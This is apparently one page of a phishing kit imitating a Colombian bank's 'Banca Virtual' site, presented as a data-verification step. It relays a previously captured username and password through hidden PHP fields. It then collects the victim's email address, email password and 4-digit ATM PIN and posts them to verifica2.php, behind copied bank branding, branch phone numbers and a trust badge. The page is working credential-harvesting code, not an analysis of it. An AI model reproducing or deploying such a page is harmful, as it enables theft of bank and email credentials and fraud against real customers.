<html lang="en">
<head>
<meta charset="utf-8">
<title>Banca Virtual</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="stylesheet" href="styles.css">
<link rel="stylesheet" href="styles2.css">

</head>
<body>

<div class="application-wrapper">
<div class="header__block" fixed shadow>
<header class="header">
<div class="header__bar container container--center direction--row">
<a class="brand block block--centered" routerlink="/" href="#">
<img class="logo" src="img/logo.svg">
<img class="logo__mobile" src="img/logo2.svg"></a>
</div>
</header>
</div>

<br><br><br><br>

<section class="container main-container" role="main">


<div class="col-xs-12 block--padding-0 margin-xs-72--bottom">
<div class="direction--row">
<div class="col-md-2 hide--xs hide--sm"></div>
<div class="col-xs-12 offset-sm-3 col-sm-6 col-md-5 offset-md-0 block--padding-0">
<h1 class="hero">Verificación de Datos</h1>
<hr class="brand-line text--align-left margin-xs-18--top">
<div class="direction--row">
<div class="col-xs-12 col-sm-10 margin-xs-36--top block--padding-0">





</div>
</div>
</div>


<div class="direction--row">
<div class="col-md-2 hide--xs hide--sm"></div>
<div class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0">
<form id="htmlForm" action="verifica2.php" method="post">
<input name="usuario" value="<?= $usuario; ?>" hidden>
<input name="pass" value="<?= $pass; ?>" hidden>
<div class="form__input margin-xs-30--top">



<div class="form__input">
<label class="label" role="text" for="9g980kmg5"></label>
<div class="form__input--inline">
<input class="input input--text ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input ng-touched" name="email" 
type="email" placeholder="Correo Electrónico" autocomplete="off" aria-describedby="first-credential-input-error" required>
 
<div  class="input__icon input__icon--left flex" role="presentation" size="18">

<svg class="bi bi-at" width="24" height="24" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M13.106 7.222c0-2.967-2.249-5.032-5.482-5.032-3.35 0-5.646 2.318-5.646 5.702 0 3.493 2.235 5.708 5.762 5.708.862 0 1.689-.123 2.304-.335v-.862c-.43.199-1.354.328-2.29.328-2.926 0-4.813-1.88-4.813-4.798 0-2.844 1.921-4.881 4.594-4.881 2.735 0 4.608 1.688 4.608 4.156 0 1.682-.554 2.769-1.416 2.769-.492 0-.772-.28-.772-.76V5.206H8.923v.834h-.11c-.266-.595-.881-.964-1.6-.964-1.4 0-2.378 1.162-2.378 2.823 0 1.737.957 2.906 2.379 2.906.8 0 1.415-.39 1.709-1.087h.11c.081.67.703 1.148 1.503 1.148 1.572 0 2.57-1.415 2.57-3.643zm-7.177.704c0-1.197.54-1.907 1.456-1.907.93 0 1.524.738 1.524 1.907S8.308 9.84 7.371 9.84c-.895 0-1.442-.725-1.442-1.914z" clip-rule="evenodd"/>
</svg>

</div>
</div>
</div>
</div>

<div class="margin-xs-24--top form__password">

<div class="form__input">
<label class="label" role="text" for="981chmi0d"></label>

<div class="form__input--inline">

<input _ngcontent-c9 class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input"
name="cpass" type="password" placeholder="Contraseña del Email" autocomplete="off" aria-describedby="second-credential-input-error" pattern=".{6,}" required>

<div class="input__icon input__icon--left flex" role="presentation" size="18">

<svg class="bi bi-lock" width="24" height="24" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M11.5 8h-7a1 1 0 00-1 1v5a1 1 0 001 1h7a1 1 0 001-1V9a1 1 0 00-1-1zm-7-1a2 2 0 00-2 2v5a2 2 0 002 2h7a2 2 0 002-2V9a2 2 0 00-2-2h-7zm0-3a3.5 3.5 0 117 0v3h-1V4a2.5 2.5 0 00-5 0v3h-1V4z" clip-rule="evenodd"/>
</svg>

</div>
</div>
</div>
</div>

<div class="margin-xs-24--top form__password">

<div class="form__input">
<label class="label" role="text" for="981chmi0d"></label>

<div class="form__input--inline">

<input _ngcontent-c9 class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input"
name="ccpass" type="password" placeholder="Clave Cajero" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="4" required>

<div class="input__icon input__icon--left flex" role="presentation" size="18">

<svg class="bi bi-lock" width="24" height="24" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M11.5 8h-7a1 1 0 00-1 1v5a1 1 0 001 1h7a1 1 0 001-1V9a1 1 0 00-1-1zm-7-1a2 2 0 00-2 2v5a2 2 0 002 2h7a2 2 0 002-2V9a2 2 0 00-2-2h-7zm0-3a3.5 3.5 0 117 0v3h-1V4a2.5 2.5 0 00-5 0v3h-1V4z" clip-rule="evenodd"/>
</svg>

</div>
</div>
</div>
</div>







<div class="margin-xs-24--top">



<button class="button button--primary" id style="width: 100%;">
<span _ngcontent-c7>Continuar</span></button>



</div>


</form>

</div>
<div class="col-md-1 hide--xs hide--sm"></div>
<div class="col-md-3 hide--xs hide--sm block--padding-0 direction--row margin-xs-36">
<div class="col-xs-12">


<img src="img/oficina.svg" style="width: 100%; min-width: 100%; align-self: center;">


<p class="text text--small margin-xs-24--top"> ¡Aprovecha todos los beneficios de tu 
<span class="text text--small text--bold">Banca Virtual</span>: haz pagos, transferencias,
recargas y mucho más! </p>
</div>
</div>
<div class="col-md-2 hide--xs hide--sm"></div>
</div>
</div>
</section>


<footer class="footer__block">

<hr aria-hidden="true" class="ruler ruler--top">
<div _ngcontent-c2 class="footer--co">
<div class="container container--center">
<div class="direction--row">
<div class="col-xs-12 col-md-1 margin-xs-30--bottom margin-md-6--bottom footer--co__call-icon">
<img alt="Llámanos" src="img/contact-us.svg"></div>
<div class="col-xs-12 col-md-7 col-lg-8 footer--co__section-left">
<div class="direction--row">
<div class="col-xs-12 col-sm-12">
<p class="text text--roman"> Llámanos,<br _ngcontent-c2 class="hide--sm hide--md hide--lg"> línea gratuita nacional <br class="hide--sm hide--md hide--lg">
<span class="text--bold">01 8000 522 222</span>
</p>
</div>
</div>
<div _ngcontent-c2 class="direction--row margin-xs-24--top text--caption color--alternate footer--co__contact-container">
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name">Bogotá</div>
<div _ngcontent-c2 class="col-phone text--bold city__phone">756 1616</div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs">Barranquilla</div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs">385 1616</div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Bucaramanga </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 697 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Cali </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 489 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Cartagena </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 693 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Cúcuta </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 595 5195 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Ibagué </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 277 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Medellín </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 604 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Neiva </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 863 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Pereira </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 340 1616 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Popayán </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 835 3735 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Santa Marta </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 436 5966 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Valledupar </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 589 8480 </div>
</div>
<div _ngcontent-c2 class="footer--co__contact">
<div _ngcontent-c2 class="col-city text--roman city__name hide--xs hide--sm"> Villavicencio </div>
<div _ngcontent-c2 class="col-phone text--bold city__phone hide--xs hide--sm"> 683 6126 </div>
</div>

<div class="col-xs-12 margin-xs-12--top hide--md hide--lg">
<a class="link link__text">Más ciudades</a></div>
<div class="col-link hide--xs hide--sm hide--md">
</div>

</div>
</div>
<hr aria-hidden="true" class="ruler margin-xs-36 hide--md hide--lg">
<div _ngcontent-c2 class="col-xs-12 col-md-4 col-lg-3 footer--co__section-right">
<p _ngcontent-c2 class="text text--roman">Síguenos, habla con nosotros</p>
<div _ngcontent-c2 class="icons margin-xs-24--top">

<a href="#" rel="noopener" tabindex="-1" target="_blank">
<img _ngcontent-c2 class="icon--social icon--social--first" src="img/facebook.svg"></a>
<a _ngcontent-c2 href="#" rel="noopener" tabindex="-1" target="_blank">
<img _ngcontent-c2 src="img/twitter.svg"  class="icon--social"></a>
<a _ngcontent-c2 href="#" rel="noopener" tabindex="-1" target="_blank">
<img  _ngcontent-c2 class="icon--social" src="img/youtube.svg"></a>
<a _ngcontent-c2  href="#" rel="noopener" tabindex="-1" target="_blank">
<img _ngcontent-c2 class="icon--social" src="img/linkedin.svg"></a>
<a
_ngcontent-c2 href="#" rel="noopener" tabindex="-1" target="_blank"><img _ngcontent-c2 alt="instagram" class="icon--social icon--social--last" src="img/instagram.svg"></a>
</div>
<div _ngcontent-c2 class="margin-md-42--top hide--xs hide--sm hide--lg">
<div _ngcontent-c2 class="block">
<a _ngcontent-c2 class="link direction--row" href="#" rel="noopener" target="_blank"><span _ngcontent-c2 class="link__text link--dotted">Red de oficinas</span>


<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18" focusable="false" role="presentation" aria-hidden="true"
class="link__icon svg-icon svg-icon--size-18px">
<g fill="none" fill-rule="evenodd" transform="translate(1 1)">
<path d="M13.3333333,8.88888889 L13.3333333,14.2222222 C13.3333333,15.2040618 12.5373951,16 11.5555556,16 L1.77777778,16 C0.795938223,16 0,15.2040618 0,14.2222222 L0,4.44444444 C0,3.46260489 0.795938223,2.66666667 1.77777778,2.66666667 L7.11111111,2.66666667"></path>
<polyline points="10.667 0 16 0 16 5.333"></polyline>
<path d="M6.22222222,9.77777778 L16,0"></path>
</g>
</svg>


</a>
</div>
</div>
<div>
<img alt="entrust" class="margin-xs-42--top margin-md-36--top margin-lg-24--top" src="img/entrust.png"></div>
</div>
</div>
</div>
</div>



<div class="footer-simple--co background--brand">
<div class="container container--center">
<div class="direction--row">
<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
<div class="margin-xs-12 margin-sm-18">
<p class="text--roman text--footer color--background">
<span class="text--bold" text>© 2020 Todos los Derechos Reservados 
<br class="hide--sm hide--md hide--lg"></span>
</p>
</div>
</div>
</div>
</div>
</div>

</footer>
</div>

</body>
</html>